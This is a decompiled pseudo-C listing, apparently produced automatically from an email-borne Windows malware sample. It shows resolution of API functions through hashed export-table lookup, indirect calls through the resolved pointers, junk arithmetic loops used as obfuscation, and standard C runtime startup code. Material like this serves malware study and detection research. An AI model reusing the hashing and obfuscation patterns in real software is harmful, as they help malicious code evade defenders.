// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0153/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401000()
{
	GetModuleHandleA(0x00000000);
	GetCurrentProcess();
	GetCurrentProcess();
	Mem0[0x004056C0:word32]();
	word32 eax_107 = 0x00000000;
	do
		eax_107 = eax_107 + 0x00000005;
	while (eax_107 <= 0x00000009);
	GetStdHandle(0xFFFFFFC0);
	Mem0[0x004056C4:word32]();
	GetCurrentProcess();
	Mem126[0x004056C8:word32] = 0x00010007;
	word32 eax_129 = 0x00000001;
	do
		eax_129 = eax_129 - 0x00000003;
	while (eax_129 >= 0x00000000);
	Mem126[0x00405994:word32]();
	GetCurrentProcess();
	Mem160[0x00405780:word32] = 0x004011E2;
	Mem160[0x00405998:word32]();
	word32 eax_166 = 0x00000000;
	do
		eax_166 = eax_166 + 0x00000001;
	while (eax_166 <= 0x00000001);
	Mem160[0x0040599C:word32]();
	return;
}

word32 fn004013E7(word32 ebp, word32 dwArg04, word32 dwArg08, ptr32 ebpOut, ptr32 clOut)
{
	GetStdHandle(0xFFFFFFA6);
	GetCurrentProcess();
	word32 eax_36 = Mem0[Mem0[dwArg04 + 0x0000003C:word32] + dwArg04 + 0x00000078:word32] + dwArg04;
	word32 eax_39 = Mem0[eax_36 + 0x00000024:word32] + dwArg04;
	GetCurrentProcess();
	word32 dwLoc04_101 = ebp;
	word32 esi_179 = dwArg08;
	byte cl_29;
	*clOut = (byte) dwArg04;
	if (StgCreateStorageEx(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) == 0x00000000)
		esi_179 = dwArg08 - 0x00045BEB;
	word32 eax_68 = Mem0[eax_36 + 0x00000020:word32] + dwArg04;
	word32 eax_72 = Mem0[eax_36 + 0x0000001C:word32] + dwArg04;
	word32 edi_160 = 0x00000000;
	word32 eax_104;
	while (edi_160 < Mem0[eax_36 + 0x00000018:word32])
	{
		GetStdHandle(0xFFFFFFCA);
		word32 eax_130 = eax_68[edi_160 * 0x00000004] + dwArg04;
		dwLoc24 = dwLoc24 & 0x00000000;
		dwLoc28 = dwLoc28 & 0x00000000;
		while (Mem0[dwLoc24 + eax_130:byte] != 0x00)
		{
			GetCurrentProcess();
			dwLoc28 = (int32) Mem0[dwLoc24 + eax_130:byte] ^ 0x000000CE ^ (dwLoc28 << 0x00000007 | dwLoc28 >>u 0x00000019);
			dwLoc24 = dwLoc24 + 0x00000001;
		}
		if (dwLoc28 == esi_179)
		{
			Mem150[fp - 0x00000038:word32] = 0xFFFFFFCB;
			GetStdHandle(0xFFFFFFCA);
			eax_104 = eax_72[(word32) eax_39[edi_160 * 0x0002] * 0x00000004] + dwArg04;
			goto l00401503;
		}
		edi_160 = edi_160 + 0x00000001;
	}
	dwLoc04_101 = ebp - 0x00000001;
	eax_104 = 0x00000000;
l00401503:
	word32 ebp_113;
	*ebpOut = dwLoc04_101;
	return eax_104;
}

word32 fn0040150C(ptr32 ebpOut)
{
	word32 eax_20 = LoadLibraryA(Mem0[0x00405000:word32]);
	GetCurrentProcess();
	word32 ebp_28;
	byte cl_29;
	Mem32[0x00405DA4:word32] = fn004013E7(fp - 0x00000004, eax_20, 0x0CA4A094, out ebp_28, out cl_29);
	GetStdHandle(0xFFFFFFF5);
	word32 ebp_41;
	byte cl_42;
	Mem45[0x004056C0:word32] = fn004013E7(ebp_28, eax_20, 0xD02A92F5, out ebp_41, out cl_42);
	word32 eax_46 = Mem45[ebp_41 - 0x00000004:word32];
	word32 edx_47 = Mem45[ebp_41 - 0x0000000C:word32];
	Mem59[ebp_41 - 0x0000000C:word32] = eax_46 + 0x00001F36 & edx_47 << 0x00000003 | (edx_47 + 0x00000097) + edx_47 & eax_46 * 0x00000008 + 0x00000AE8 << cl_42;
	word32 ebp_64;
	byte cl_65;
	Mem68[0x004056C4:word32] = fn004013E7(ebp_41, eax_20, 0x93FA0A5E, out ebp_64, out cl_65);
	word32 edx_70 = Mem68[ebp_64 - 0x00000004:word32];
	word32 eax_69 = Mem68[ebp_64 - 0x0000000C:word32];
	Mem81[ebp_64 - 0x00000008:word32] = eax_69 * 0x00000008 + 0x00002382 | (edx_70 + 0x00000AD3) + edx_70 << (byte) ((edx_70 + 0x00000F17) + eax_69 * 0x00000002);
	word32 ebp_86;
	byte cl_87;
	Mem90[0x00405994:word32] = fn004013E7(ebp_64, eax_20, 0xE0895544, out ebp_86, out cl_87);
	GetCurrentProcess();
	word32 ebp_96;
	byte cl_97;
	Mem100[0x00405998:word32] = fn004013E7(ebp_86, eax_20, 0xE0897D44, out ebp_96, out cl_97);
	word32 eax_101 = 0x00000000;
	do
	{
		word32 edx_105 = Mem100[ebp_96 - 0x00000008:word32];
		Mem107[ebp_96 - 0x0000000C:word32] = edx_105 + 0x0000139E + edx_105;
		eax_101 = eax_101 + 0x00000004;
	} while (eax_101 <= 0x00000009);
	Mem112[fp - 0x0000002C:word32] = 0x4DFD956E;
	word32 ebp_115;
	byte cl_116;
	Mem119[0x0040599C:word32] = fn004013E7(ebp_96, eax_20, 0xE0897D44, out ebp_115, out cl_116);
	word32 edx_121 = Mem119[ebp_115 - 0x0000000C:word32];
	Mem131[ebp_115 - 0x00000004:word32] = 0x00000000 << (byte) ((edx_121 + 0x0000006D) + edx_121) | Mem119[ebp_115 - 0x00000004:word32] << 0x00000003;
	Mem133[fp - 0x0000002C:word32] = 0x0B24A3AB;
	word32 ebp_136;
	byte cl_137;
	Mem140[0x00405DA8:word32] = fn004013E7(ebp_115, eax_20, 0xE0897D44, out ebp_136, out cl_137);
	Mem142[fp - 0x0000002C:word32] = 0xFFFFFFA3;
	GetStdHandle(0xE0897D44);
	Mem146[fp - 0x0000002C:word32] = 0xFED9AA73;
	word32 ebp_149;
	byte cl_150;
	Mem153[0x004059A0:word32] = fn004013E7(ebp_136, eax_20, 0xE0897D44, out ebp_149, out cl_150);
	Mem155[fp - 0x0000002C:word32] = 0x00000104;
	GetModuleFileNameA(0x00000000, 0x00405DAC, 0xE0897D44);
	GetCurrentProcess();
	Mem164[fp - 0x0000002C:word32] = Mem155[0x0040502C:word32];
	lstrcpyA(0x00405EB0, 0xE0897D44);
	word32 eax_169 = Mem164[ebp_149 - 0x00000004:word32];
	Mem171[ebp_149 - 0x00000014:word32] = eax_169 * 0x00000002;
	Mem174[ebp_149 - 0x00000010:word32] = Mem171[ebp_149 - 0x0000000C:word32] * 0x00000002;
	word32 edi_188 = Mem174[ebp_149 - 0x00000010:word32] >>u (byte) Mem174[ebp_149 - 0x00000008:word32];
	Mem197[ebp_149 - 0x0000000C:word32] = eax_169 << 0x00000003 & Mem174[ebp_149 - 0x00000010:word32] + 0x000000BD | (eax_169 * 0x00000002 << (byte) Mem174[ebp_149 - 0x00000014:word32] ^ Mem174[ebp_149 - 0x00000008:word32] + 0x000003F2 | eax_169 * 0x00000004 + 0x00000AEF >>u (byte) Mem174[ebp_149 - 0x00000014:word32] ^ edi_188);
	Mem199[fp - 0x0000002C:word32] = Mem197[0x00405028:word32];
	lstrcatA(0x00405EB0, 0xE0897D44);
	GetCurrentProcess();
	Mem206[fp - 0x0000002C:word32] = Mem199[0x0040501C:word32];
	lstrcatA(0x00405EB0, 0xE0897D44);
	GetCurrentProcess();
	Mem213[fp - 0x0000002C:word32] = 0x00405DAC;
	lstrcatA(0x00405EB0, 0xE0897D44);
	Mem219[fp - 0x0000002C:word32] = 0xFFFFFFB4;
	GetStdHandle(0xE0897D44);
	Mem222[0x00405FB4:word32] = 0x00000044;
	word32 eax_223 = 0x00000000;
	do
	{
		word32 ecx_228 = Mem222[ebp_149 - 0x00000004:word32];
		word32 edx_227 = Mem222[ebp_149 - 0x00000008:word32];
		word32 esi_234 = (edx_227 + 0x0000024F) *s ((ecx_228 + 0x000026F2) + ecx_228) >>u (byte) Mem222[ebp_149 - 0x0000000C:word32];
		byte cl_237 = (byte) (edx_227 * 0x00000002);
		word32 edx_239 = esi_234 >>u cl_237;
		Mem240[ebp_149 - 0x00000004:word32] = edx_239;
		eax_223 = eax_223 + 0x00000005;
	} while (eax_223 <= 0x00000002);
	Mem244[0x00405FE0:word32] = 0x00000001;
	Mem246[fp - 0x0000002C:word32] = 0xFFFFFFAE;
	GetStdHandle(0xFFFFFFB4);
	Mem249[0x00405FE4:word16] = 0x0002;
	Mem251[fp - 0x0000002C:word32] = 0xFFFFFFD8;
	word32 eax_252 = GetStdHandle(0xFFFFFFB4);
	Mem255[fp - 0x0000002C:word32] = 0x004056B0;
	Mem257[fp - 0x00000030:word32] = 0x00405FB4;
	Mem259[fp - 0x00000034:word32] = 0x00000000;
	Mem259[0x00405DA4:word32]();
	word32 eax_276 = 0x00000004;
	do
	{
		word32 edx_284 = (Mem259[ebp_149 - 0x0000000C:word32] << 0x00000003) + 0x00000074 + Mem259[ebp_149 - 0x00000004:word32] * 0x00000002 | Mem259[ebp_149 - 0x00000008:word32] + 0x00001A39;
		Mem285[ebp_149 - 0x00000008:word32] = edx_284;
		eax_276 = eax_276 - 0x00000005;
	} while (eax_276 >= 0x00000000);
	Mem285[0x004059A0:word32]();
	GetCurrentProcess();
	word32 ebp_297;
	byte cl_298;
	Mem301[0x00405FF8:word32] = fn004013E7(ebp_149, eax_276, 0xF9C21A23, out ebp_297, out cl_298);
	word32 ecx_307 = Mem301[ebp_297 - 0x00000008:word32];
	Mem319[ebp_297 - 0x0000000C:word32] = ecx_307 + 0x00002375 >>u (byte) ecx_307 << (byte) (Mem301[ebp_297 - 0x0000000C:word32] * 0x00000002 + 0x00000353) | Mem301[ebp_297 - 0x00000004:word32] * 0x00000002 >>u cl_298;
	word32 ebp_324;
	byte cl_325;
	Mem328[0x00405FFC:word32] = fn004013E7(ebp_297, eax_276, 0x32CC1782, out ebp_324, out cl_325);
	GetCurrentProcess();
	word32 ebp_334;
	byte cl_335;
	Mem338[0x00406000:word32] = fn004013E7(ebp_324, eax_276, 0xF2E9080D, out ebp_334, out cl_335);
	GetStdHandle(0xFFFFFFDC);
	word32 ebp_347;
	byte cl_348;
	Mem351[0x00406004:word32] = fn004013E7(ebp_334, eax_276, 0x50B59C09, out ebp_347, out cl_348);
	word32 eax_354 = 0x00000001;
	do
	{
		word32 ecx_358 = Mem351[ebp_347 - 0x00000004:word32];
		word32 edx_357 = Mem351[ebp_347 - 0x0000000C:word32];
		Mem365[ebp_347 - 0x00000008:word32] = edx_357 * 0x00000002 * 0x00000002 ^ ((ecx_358 + 0x000003DD) + ecx_358) *s ((edx_357 + 0x00000098) + edx_357);
		eax_354 = eax_354 - 0x00000005;
	} while (eax_354 >= 0x00000000);
	Mem370[fp - 0x00000058:word32] = 0xDE4E4E54;
	word32 ebp_373;
	byte cl_374;
	Mem377[0x00406008:word32] = fn004013E7(ebp_347, eax_276, 0x50B59C09, out ebp_373, out cl_374);
	word32 edx_379 = Mem377[ebp_373 - 0x00000008:word32];
	word32 edi_383 = edx_379 * 0x00000002 >>u cl_374;
	word32 eax_378 = Mem377[ebp_373 - 0x0000000C:word32];
	word32 ecx_390 = 0xFFFFF272 - eax_378 & edi_383 >>u cl_374 ^ eax_378 + 0x00002596;
	word32 eax_394 = eax_378 * 0x00000004 + 0x00001732 ^ edx_379 * 0x00000002 | ecx_390;
	Mem397[ebp_373 - 0x00000008:word32] = eax_394;
	Mem399[fp - 0x00000058:word32] = Mem397[0x0040500C:word32];
	Mem399[0x004059A0:word32]();
	GetStdHandle(0xFFFFFFBC);
	word32 ebp_409;
	byte cl_410;
	Mem413[0x0040600C:word32] = fn004013E7(ebp_373, eax_394, 0x6D9EE2CC, out ebp_409, out cl_410);
	word32 eax_414 = Mem413[ebp_409 - 0x00000004:word32];
	Mem423[ebp_409 - 0x00000004:word32] = eax_414 *s (eax_414 + 0x00000E97) * 0x00000002 * 0x00000002 & eax_414 * 0x00000004 + 0x00000DF9;
	fn00401000();
	word32 eax_424 = 0x00000000;
	do
	{
		word32 edx_428 = Mem423[ebp_409 - 0x0000000C:word32];
		word32 ebx_429 = Mem423[ebp_409 - 0x00000004:word32];
		Mem453[ebp_409 - 0x00000004:word32] = edx_428 * 0x00000004 + 0x00001EA2 ^ (ebx_429 + 0x000000CB) + ebx_429 & edx_428 * 0x00000002 << (byte) (((ebx_429 << 0x00000003) - (edx_428 * 0x00000002 + 0x00000FC8)) - (edx_428 * 0x00000002 + 0x000000F9)) ^ Mem423[ebp_409 - 0x00000008:word32] << 0x00000003 & (ebx_429 + 0x00001F1D) *s (edx_428 * 0x00000002) << (byte) (ebx_429 + 0x00001F1D);
		eax_424 = eax_424 + 0x00000002;
	} while (eax_424 <= 0x00000006);
	Mem457[ebp_409 - 0x00000004:word32] = 0x303AEB76;
	Mem458[ebp_409 - 0x00000008:word32] = 0x3F4BA38B;
	Mem460[ebp_409 - 0x0000000C:word32] = Mem458[ebp_409 - 0x0000000C:word32] - 0x00000001;
	word32 ebp_470;
	*ebpOut = Mem460[ebp_409 + 0x00000000:word32];
	return 0x00000000;
}

void fn00401C10(word32 edx, word32 ebx, word32 ebp, selector fs)
{
	Mem16[fs:0x00000000:word32] = fp - 0x00000014;
	Mem34[0x00405058:word32] = fn004027E0(0x02000000);
	if (fn00401FD0() == 0x00000000)
	{
		Mem128[fp - 0x00000074:word32] = 0x00000001;
		fn004020C0(0x02000000);
	}
	Mem43[fp - 0x00000008:word32] = 0x00000000;
	fn004020D0(edx, ebx);
	fn00402140();
	fn00402190();
	fn00402570();
	fn00402610();
	word32 ebx_125 = 0x004040E0;
	while (ebx_125 <u 0x004040E0)
	{
		Mem43[ebx_125 + 0x00000000:word32]();
		ebx_125 = ebx_125 + 0x00000004;
	}
	word32 edx_123;
	GetStartupInfoA(fp - 0x00000064);
	GetModuleHandleA(0x00000000);
	fn004026D0();
	if (0x00 != 0x00)
		edx_123 = (word32) wLoc34;
	else
		edx_123 = 0x0000000A;
	Mem75[fp - 0x00000074:word32] = edx_123;
	word32 esp_84 = fp - 0x00000070;
	word32 ebp_82;
	word32 ebx_85 = fn0040150C(out ebp_82);
	word32 esi_120 = 0x004040E0;
	while (esi_120 <u 0x004040E0)
	{
		Mem75[esi_120 + 0x00000000:word32]();
		esi_120 = esi_120 + 0x00000004;
	}
	Mem101[esp_84 - 0x00000004:word32] = ebx_85;
	fn00402710(dwArg00);
	Mem106[ebp_82 - 0x00000004:word32] = Mem101[ebp_82 - 0x00000004:word32] | 0xFFFFFFFF;
	Mem115[fs:0x00000000:word32] = Mem106[ebp_82 - 0x00000010:word32];
	return;
}

word32 fn00401FD0()
{
	word32 eax_8 = HeapCreate(0x00000001, 0x00001000, 0x00000000);
	Mem10[0x00405698:word32] = eax_8;
	if (eax_8 != 0x00000000)
		return 0x00000001;
	else
		return 0x00000000;
}

word32 fn00402020(word32 dwArg04)
{
	return HeapAlloc(Mem0[0x00405698:word32], 0x00000001, dwArg04);
}

void fn00402060(word32 dwArg04)
{
	HeapFree(Mem0[0x00405698:word32], 0x00000001, dwArg04);
	return;
}

word32 fn004020C0(word32 dwArg04)
{
	ExitProcess(dwArg04);
	return dwArg04;
}

void fn004020D0(word32 edx, word32 ebx)
{
	if ((SCZDOP ^ 0x00200000 ^ SCZDOP) != 0x00000000)
	{
		word32 eax_41;
		word32 ebx_42;
		word32 ecx_43;
		word32 edx_44;
		__cpuid(0x00000000, SCZDOP, &eax_41, &ebx_42, &ecx_43, &edx_44);
		if (eax_41 >= 0x00000001)
		{
			word32 eax_48;
			word32 ebx_49;
			word32 ecx_50;
			word32 edx_51;
			__cpuid(0x00000001, ecx_43, &eax_48, &ebx_49, &ecx_50, &edx_51);
			word32 eax_52 = 0x00000000;
			if ((edx_51 & 0x00800000) != 0x00000000)
				eax_52 = 0x00000001;
			if ((edx_51 & 0x01000000) != 0x00000000)
				eax_52 = eax_52 | 0x00000010;
			if ((edx_51 & 0x02000000) != 0x00000000)
				eax_52 = eax_52 | 0x00000002;
			if ((edx_51 & 0x04000000) != 0x00000000)
				eax_52 = eax_52 | 0x00000004;
			if ((ecx_50 & 0x00000001) != 0x00000000)
				eax_52 = eax_52 | 0x00000008;
			Mem75[0x00405110:word32] = eax_52;
		}
	}
	return;
}

void fn00402140()
{
	GetSystemTimeAsFileTime(0x004056A0);
	return;
}

void fn00402190()
{
	word32 eax_19 = fn00402DB0(0x00000100);
	word32 ebx_22 = eax_19;
	if (eax_19 == 0x00000000)
	{
		Mem343[fp - 0x0000006C:word32] = 0x00000001;
		fn004020C0(0x00000100);
	}
	Mem29[0x00406010:word32] = eax_19;
	Mem30[0x00406110:word32] = 0x00000020;
	while (ebx_22 <u Mem30[0x00406010:word32] + 0x00000100)
	{
		Mem337[ebx_22 + 0x00000004:byte] = 0x00;
		Mem338[ebx_22 + 0x00000000:word32] = 0xFFFFFFFF;
		Mem339[ebx_22 + 0x00000005:byte] = 0x0A;
		ebx_22 = ebx_22 + 0x00000008;
	}
	GetStartupInfoA(fp - 0x00000048);
	if (wLoc16 != 0x0000 && dwLoc14 != 0x00000000)
	{
		word32 esi_218 = Mem30[dwLoc14 + 0x00000000:word32];
		word32 dwLoc54_220 = dwLoc14 + 0x00000004;
		word32 dwLoc50_223 = esi_218 + (dwLoc14 + 0x00000004);
		if (esi_218 > 0x00000800)
			esi_218 = 0x00000800;
		word32 edi_227 = 0x00000001;
		if (Mem30[0x00406110:word32] < esi_218)
			do
			{
				word32 eax_311 = fn00402DB0(0x00000100);
				word32 ebx_314 = eax_311;
				if (eax_311 == 0x00000000)
				{
					esi_218 = Mem30[0x00406110:word32];
					goto l00402282;
				}
				0x00406010[edi_227 * 0x00000004] = eax_311;
				Mem321[0x00406110:word32] = Mem319[0x00406110:word32] + 0x00000020;
				while (ebx_314 <u 0x00406010[edi_227 * 0x00000004] + 0x00000100)
				{
					Mem331[ebx_314 + 0x00000004:byte] = 0x00;
					Mem332[ebx_314 + 0x00000000:word32] = 0xFFFFFFFF;
					Mem333[ebx_314 + 0x00000005:byte] = 0x0A;
					ebx_314 = ebx_314 + 0x00000008;
				}
				edi_227 = edi_227 + 0x00000001;
			} while (Mem321[0x00406110:word32] < esi_218);
l00402282:
		word32 edi_239 = 0x00000000;
		if (esi_218 > 0x00000000)
			do
			{
				word32 eax_253 = Mem30[dwLoc50_223 + 0x00000000:word32];
				if (eax_253 != 0xFFFFFFFF)
				{
					word32 edx_274 = (word32) Mem30[dwLoc54_220 + 0x00000000:byte];
					if ((edx_274 & 0x00000001) != 0x00000000 && ((edx_274 & 0x00000008) != 0x00000000 || GetFileType(eax_253) != 0x00000000))
					{
						word32 ebx_292 = 0x00406010[(edi_239 >> 0x00000005) * 0x00000004] + (edi_239 & 0x0000001F) * 0x00000008;
						Mem295[ebx_292 + 0x00000000:word32] = Mem30[dwLoc50_223 + 0x00000000:word32];
						Mem298[ebx_292 + 0x00000004:byte] = Mem295[dwLoc54_220 + 0x00000000:byte];
					}
				}
				edi_239 = edi_239 + 0x00000001;
				dwLoc54_220 = dwLoc54_220 + 0x00000001;
				dwLoc50_223 = dwLoc50_223 + 0x00000004;
			} while (edi_239 < esi_218);
	}
	word32 edi_109 = 0x00000000;
	do
	{
		if (Mem30[ebx_91 + 0x00000000:word32] == 0xFFFFFFFF)
		{
			word32 eax_133;
			Mem125[ebx_91 + 0x00000004:byte] = 0x81;
			if (edi_109 == 0x00000000)
				eax_133 = 0xFFFFFFF6;
			else if (edi_109 == 0x00000001)
				eax_133 = 0xFFFFFFF5;
			else
				eax_133 = 0xFFFFFFF4;
			word32 eax_136 = GetStdHandle(eax_133);
			word32 esi_138 = eax_136;
			if (eax_136 != 0xFFFFFFFF)
			{
				word32 eax_152 = GetFileType(eax_136);
				if (eax_152 != 0x00000000)
				{
					word32 eax_158 = GetCurrentProcess();
					word32 eax_160 = GetCurrentProcess();
					Mem164[fp - 0x00000070:word32] = 0x00000001;
					Mem166[fp - 0x00000074:word32] = 0x00000000;
					if (DuplicateHandle(eax_158, eax_136, eax_160, fp - 0x0000004C, 0x00000000, 0x00000001, 0x00000002) != 0x00000000)
						esi_138 = dwLoc4C;
					Mem183[ebx_91 + 0x00000000:word32] = esi_138;
					if ((eax_152 & 0x000000FF) == 0x00000002)
						Mem189[ebx_91 + 0x00000004:byte] = Mem183[ebx_91 + 0x00000004:byte] | 0x40;
					else if ((eax_152 & 0x000000FF) == 0x00000003)
						Mem197[ebx_91 + 0x00000004:byte] = Mem183[ebx_91 + 0x00000004:byte] | 0x08;
				}
				else
				{
l00402388:
					Mem147[ebx_91 + 0x00000004:byte] = Mem128[ebx_91 + 0x00000004:byte] | 0x40;
				}
			}
			else
				goto l00402388;
		}
		else
			Mem211[ebx_91 + 0x00000004:byte] = Mem30[ebx_91 + 0x00000004:byte] | 0x80;
		edi_109 = edi_109 + 0x00000001;
	} while (edi_109 < 0x00000003);
	SetHandleCount(Mem30[0x00406110:word32]);
	return;
}

void fn004023E0(word32 dwArg04, word32 dwArg08, word32 dwArg0C, word32 dwArg10, word32 dwArg14)
{
	Mem24[dwArg14 + 0x00000000:word32] = 0x00000000;
	Mem27[dwArg10 + 0x00000000:word32] = 0x00000001;
	word32 edx_19 = dwArg08;
	word32 ebx_104 = dwArg0C;
	word32 edi_105 = dwArg04;
	if (dwArg08 != 0x00000000)
	{
		Mem309[dwArg08 + 0x00000000:word32] = dwArg0C;
		edx_19 = dwArg08 + 0x00000004;
	}
	if (Mem27[dwArg04 + 0x00000000:byte] == 0x22)
	{
		edi_105 = edi_105 + 0x00000001;
		while (Mem27[edi_105 + 0x00000000:byte] != 0x22 && Mem27[edi_105 + 0x00000000:byte] != 0x00)
		{
			if (ebx_104 != 0x00000000)
			{
				Mem269[ebx_104 + 0x00000000:byte] = Mem27[edi_105 + 0x00000000:byte];
				ebx_104 = ebx_104 + 0x00000001;
			}
			Mem266[dwArg14 + 0x00000000:word32] = Mem27[dwArg14 + 0x00000000:word32] + 0x00000001;
			edi_105 = edi_105 + 0x00000001;
		}
		if (ebx_104 != 0x00000000)
		{
			Mem255[ebx_104 + 0x00000000:byte] = 0x00;
			ebx_104 = ebx_104 + 0x00000001;
		}
		Mem250[dwArg14 + 0x00000000:word32] = Mem27[dwArg14 + 0x00000000:word32] + 0x00000001;
		if (Mem250[edi_105 + 0x00000000:byte] == 0x22)
			edi_105 = edi_105 + 0x00000001;
	}
	else
	{
		do
		{
			if (ebx_104 != 0x00000000)
			{
				Mem306[ebx_104 + 0x00000000:byte] = Mem27[edi_105 + 0x00000000:byte];
				ebx_104 = ebx_104 + 0x00000001;
			}
			Mem283[dwArg14 + 0x00000000:word32] = Mem27[dwArg14 + 0x00000000:word32] + 0x00000001;
			edi_105 = edi_105 + 0x00000001;
			byte al_286 = Mem283[edi_105 + 0x00000000:byte];
		} while (al_286 == 0x20 || (al_286 == 0x00 || al_286 == 0x09));
		if (al_286 == 0x00)
			edi_105 = edi_105 - 0x00000001;
		else if (ebx_104 != 0x00000000)
			Mem299[ebx_104 - 0x00000001:byte] = 0x00;
	}
	word32 dwLoc08_100 = 0x00000000;
	while (true)
	{
		if (Mem27[edi_105 + 0x00000000:byte] != 0x00)
		{
			byte al_224 = Mem27[edi_105 + 0x00000000:byte];
			while (al_224 == 0x20 || al_224 == 0x09)
			{
				edi_105 = edi_105 + 0x00000001;
				al_224 = Mem27[edi_105 + 0x00000000:byte];
			}
		}
		if (Mem27[edi_105 + 0x00000000:byte] == 0x00)
		{
			if (edx_19 != 0x00000000)
				Mem220[edx_19 + 0x00000000:word32] = 0x00000000;
			Mem210[dwArg10 + 0x00000000:word32] = Mem27[dwArg10 + 0x00000000:word32] + 0x00000001;
			return;
		}
		if (edx_19 != 0x00000000)
		{
			Mem201[edx_19 + 0x00000000:word32] = ebx_104;
			edx_19 = edx_19 + 0x00000004;
		}
		Mem76[dwArg10 + 0x00000000:word32] = Mem27[dwArg10 + 0x00000000:word32] + 0x00000001;
		while (true)
		{
			word32 dwLoc14_101 = 0x00000000;
			while (Mem76[edi_105 + 0x00000000:byte] == 0x5C)
			{
				edi_105 = edi_105 + 0x00000001;
				dwLoc14_101 = dwLoc14_101 + 0x00000001;
			}
			if (Mem76[edi_105 + 0x00000000:byte] == 0x22)
			{
				Mem164[fp - 0x0000000C:word32] = 0x00000001;
				if ((bLoc14 & 0x01) == 0x00)
				{
					if (dwLoc08_100 == 0x00000000)
						Mem196[fp - 0x0000000C:word32] = 0x00000000;
					else if (Mem164[edi_105 + 0x00000001:byte] == 0x22)
					{
						Mem194[fp - 0x0000000C:word32] = 0x00000001;
						edi_105 = edi_105 + 0x00000001;
					}
					else
						Mem195[fp - 0x0000000C:word32] = 0x00000000;
					dwLoc08_100 = (word32) (dwLoc08_100 == 0x00000000);
				}
				dwLoc14_101 = dwLoc14_101 >>u 0x00000001;
				goto l0040250D;
			}
l0040250D:
			dwLoc14_101 = dwLoc14_101 - 0x00000001;
			while (dwLoc14_101 != 0x00000000)
			{
				if (ebx_104 != 0x00000000)
				{
					Mem161[ebx_104 + 0x00000000:byte] = 0x5C;
					ebx_104 = ebx_104 + 0x00000001;
				}
				Mem159[dwArg14 + 0x00000000:word32] = Mem76[dwArg14 + 0x00000000:word32] + 0x00000001;
				dwLoc14_101 = dwLoc14_101 - 0x00000001;
			}
			byte al_112 = Mem76[edi_105 + 0x00000000:byte];
			if (al_112 == 0x00 || dwLoc08_100 == 0x00000000 && (al_112 == 0x20 || al_112 == 0x09))
			{
				if (ebx_104 != 0x00000000)
				{
					Mem125[ebx_104 + 0x00000000:byte] = 0x00;
					ebx_104 = ebx_104 + 0x00000001;
				}
				Mem123[dwArg14 + 0x00000000:word32] = Mem76[dwArg14 + 0x00000000:word32] + 0x00000001;
			}
			if (0x00000001 != 0x00000000)
			{
				if (ebx_104 != 0x00000000)
				{
					Mem147[ebx_104 + 0x00000000:byte] = Mem76[edi_105 + 0x00000000:byte];
					ebx_104 = ebx_104 + 0x00000001;
				}
				Mem144[dwArg14 + 0x00000000:word32] = Mem76[dwArg14 + 0x00000000:word32] + 0x00000001;
			}
			edi_105 = edi_105 + 0x00000001;
		}
	}
}

void fn00402570()
{
	word32 eax_13 = GetCommandLineA();
	word32 ebx_14 = eax_13;
	if (Mem0[eax_13 + 0x00000000:byte] == 0x00)
	{
		GetModuleFileNameA(0x00000000, fp + 0xFFFFFEF0, 0x00000104);
		dwLoc011C = 0x00000104;
		dwLoc0124 = 0x00000000;
		ebx_14 = fp + 0xFFFFFEF0;
	}
	Mem25[fp - 0x0000011C:word32] = fp - 0x0000000C;
	Mem30[fp - 0x00000124:word32] = 0x00000000;
	fn004023E0(ebx_14, 0x00000000, dwLoc0124, fp - 0x00000008, dwLoc011C);
	Mem43[fp - 0x0000011C:word32] = dwLoc0C + dwLoc08 * 0x00000004;
	word32 eax_44 = fn00402DB0(dwLoc011C);
	if (eax_44 == 0x00000000)
		fn004020C0(0x00000001);
	Mem61[fp - 0x00000124:word32] = eax_44 + dwLoc08 * 0x00000004;
	Mem63[fp - 0x00000128:word32] = eax_44;
	fn004023E0(ebx_14, 0x00000000, dwLoc0124, fp - 0x00000008, fp - 0x0000000C);
	Mem71[0x00405040:word32] = dwLoc08 - 0x00000001;
	Mem72[0x00405044:word32] = eax_44;
	return;
}

void fn00402610()
{
	word32 eax_152 = GetEnvironmentStrings();
	word32 ebx_158 = eax_152;
	if (eax_152 == 0x00000000)
		ebx_158 = Mem0[0x00405114:word32];
	word32 esi_154 = ebx_158;
	word32 ecx_151 = 0x00000000;
	while (Mem0[esi_154 + 0x00000000:byte] != 0x00)
	{
		word32 eax_138 = eax_152 | 0xFFFFFFFF;
		do
			eax_138 = eax_138 + 0x00000001;
		while (Mem0[esi_154 + eax_138:byte] != 0x00);
		if (Mem0[esi_154 + 0x00000000:byte] != 0x3D)
			ecx_151 = ecx_151 + (eax_138 + 0x00000001);
		eax_152 = eax_138 + 0x00000001;
		esi_154 = esi_154 + (eax_138 + 0x00000001);
	}
	word32 eax_109 = fn00402DB0(ecx_151 + 0x00000001);
	Mem48[0x0040504C:word32] = eax_109;
	word32 edi_107 = eax_109;
	if (Mem48[0x0040504C:word32] == 0x00000000)
		eax_109 = fn004020C0(0x00000001);
	word32 esi_111 = ebx_158;
	while (Mem48[esi_111 + 0x00000000:byte] != 0x00)
	{
		word32 eax_88 = eax_109 | 0xFFFFFFFF;
		do
			eax_88 = eax_88 + 0x00000001;
		while (Mem48[esi_111 + eax_88:byte] != 0x00);
		if (Mem48[esi_111 + 0x00000000:byte] != 0x3D)
		{
			word32 edx_114 = esi_111;
			word32 ecx_117 = edi_107 - esi_111;
			do
			{
				byte al_120 = Mem48[edx_114 + 0x00000000:byte];
				Mem121[ecx_117 + edx_114:byte] = al_120;
				edx_114 = edx_114 + 0x00000001;
			} while (al_120 != 0x00);
			edi_107 = edi_107 + (eax_88 + 0x00000001);
		}
		eax_109 = eax_88 + 0x00000001;
		esi_111 = esi_111 + (eax_88 + 0x00000001);
	}
	Mem70[edi_107 + 0x00000000:byte] = 0x00;
	if (ebx_158 != Mem70[0x00405114:word32])
		FreeEnvironmentStringsA(ebx_158);
	return;
}

void fn004026D0()
{
	word32 eax_2 = GetCommandLineA();
	word32 edx_10 = eax_2;
	if (Mem0[eax_2 + 0x00000000:byte] == 0x22)
	{
		do
			edx_10 = edx_10 + 0x00000001;
		while (Mem0[edx_10 + 0x00000000:byte] == 0x22 || Mem0[edx_10 + 0x00000000:byte] == 0x00);
		if (Mem0[edx_10 + 0x00000000:byte] == 0x22)
		{
			edx_10 = edx_10 + 0x00000001;
			goto l004026FB;
		}
	}
	while (Mem0[edx_10 + 0x00000000:byte] >u 0x20)
		edx_10 = edx_10 + 0x00000001;
l004026FB:
